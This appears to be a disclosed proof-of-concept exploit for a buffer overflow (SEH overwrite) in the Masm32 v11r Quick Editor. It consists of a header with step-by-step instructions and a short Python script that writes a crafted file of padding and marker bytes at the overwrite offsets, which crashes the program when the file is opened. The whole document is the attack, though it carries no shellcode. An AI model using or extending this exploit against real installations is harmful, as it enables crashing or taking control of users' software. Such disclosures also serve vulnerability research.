# EXPLOIT TITLE: Masm32v11r Buffer Overflow(SEH overwrite) crash POC
# AUTHOR: VIKRAMADITYA "-OPTIMUS"
# Date of Testing: 22nd September 2015
# Download Link : http://www.masm32.com/masmdl.htm
# Tested On : Windows 10 
# Steps to Crash :-
# Step 1: Execute this python script
# Step 2: This script will create a file called MASM_crash.txt
# Step 3: Now open Masm32's QUICK EDITOR  
# Step 4: Go to Script > 'Convert Text to Script'
# Step 5: Open the MASM_crash.txt to convert 
# Step 6: That should crash the program .  


file = open('MASM_crash.txt' , 'w');
buffer = "A"*4676 + "B"*4 + "C"*4 + "D"*500
file.write(buffer);
file.close()
